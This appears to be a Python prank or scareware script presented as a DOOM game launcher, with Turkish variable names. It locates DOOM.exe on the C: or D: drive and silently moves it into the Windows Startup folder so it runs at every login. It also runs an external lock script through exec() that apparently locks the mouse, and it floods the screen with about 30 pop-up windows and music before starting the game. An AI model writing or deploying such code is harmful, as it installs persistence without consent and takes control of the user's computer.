import time
from threading import Thread
import os
DOOM_konum = os.path.expanduser('~/Doomed/DOOM')
import sys
sys.path.append(DOOM_konum)
sys.path.append('DOOM')
from playsound import playsound
import keyboard
import mouse
import shutil
import first
import tkinter as tk
from PIL import Image, ImageTk
from itertools import count, cycle
import random

def find(name, path):
    for root, dirs, files in os.walk(path):
        if name in files:
            return os.path.join(root, name)
TasinacakDosya = "DOOM.exe"
doomedKonum = os.path.expanduser('~/Doomed')
hedefKonum = os.path.expanduser('~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
oradaMi = hedefKonum + "/" + TasinacakDosya
#Başlangıçta çalıştırma muhabbeti
def BaslangicaTasi(TasinacakDosya):
    removeFromLast = 8
    aramaSonucu = find(TasinacakDosya, "C:")
    if(aramaSonucu != None):
        if not os.path.isdir(doomedKonum):
            os.mkdir(doomedKonum)
        if not os.path.isfile(oradaMi):
            tumDosyalar = os.listdir(aramaSonucu[:-removeFromLast])
            for herBirDosya in tumDosyalar:
                if herBirDosya != TasinacakDosya:
                    shutil.move(os.path.join(aramaSonucu[:-removeFromLast], herBirDosya), doomedKonum)
                else:
                    shutil.move(os.path.join(aramaSonucu[:-removeFromLast], herBirDosya), hedefKonum)
            return True
        return False 
    else:
        aramaSonucu = find(TasinacakDosya, "D:")
        if not os.path.isdir(doomedKonum):
            os.mkdir(doomedKonum)
        if not os.path.isfile(oradaMi):
            tumDosyalar = os.listdir(aramaSonucu[:-removeFromLast])
            for herBirDosya in tumDosyalar:
                if herBirDosya != TasinacakDosya:
                    shutil.move(os.path.join(aramaSonucu[:-removeFromLast], herBirDosya), doomedKonum)
                else:
                    shutil.move(os.path.join(aramaSonucu[:-removeFromLast], herBirDosya), hedefKonum)
            return True
        return False 

ilkSefer = BaslangicaTasi(TasinacakDosya)

loopforDelay = True

def Yazilar():
    playsound(DOOM_konum+'/music.wav', block=False)
    first.kafatasiSekmesi()
    for i in range(0, 29):
        Thread(target= first.aciklamaSekmesi).start()
    first.sonSekme()
    global loopforDelay
    loopforDelay = False
    Thread(target=mouseDelayedRelease).start()
    Thread(target=startGame).start()

def mouseDelayedRelease():
    while(loopforDelay):
        continue
    time.sleep(1)
    global fareyiKilitle
    fareyiKilitle = False

def startGame():
    os.system('python '+DOOM_konum+'/main.py')

def Lock():
    fromPy = open(DOOM_konum+"/lock.py", 'r')
    exec(fromPy.read())
    fromPy.close()

Thread(target=Lock).start()
if not ilkSefer:
    Thread(target=Yazilar).start()